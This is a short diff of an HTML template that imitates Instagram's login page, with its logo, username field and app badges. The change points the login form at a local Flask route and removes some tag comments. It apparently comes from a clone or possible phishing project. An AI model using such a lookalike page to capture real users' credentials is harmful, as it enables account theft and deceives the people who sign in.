@@ -18,7 +18,7 @@
                     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div>
                 <div class="form-wrap">
-                  <form class="form" method="post" action="/">
+                  <form class="form" method="post" action="{{ url_for('login_page') }}">
                     <div class="input-box">
                       <input type="text" name="username" placeholder="Phone number, username, or email" required>
                     </div>  
@@ -46,11 +46,11 @@
                     <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                       <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                     </a>  
-                  </div>  <!-- App-img end-->
-                </div> <!-- App end -->
-              </div> <!-- Content end -->
+                  </div>
+                </div>
+              </div>
             </article>
-          </div> <!-- Wrapper end -->
+          </div>
         </main>
       <footer class="footer" role="contentinfo">
         <div class="footer-container">
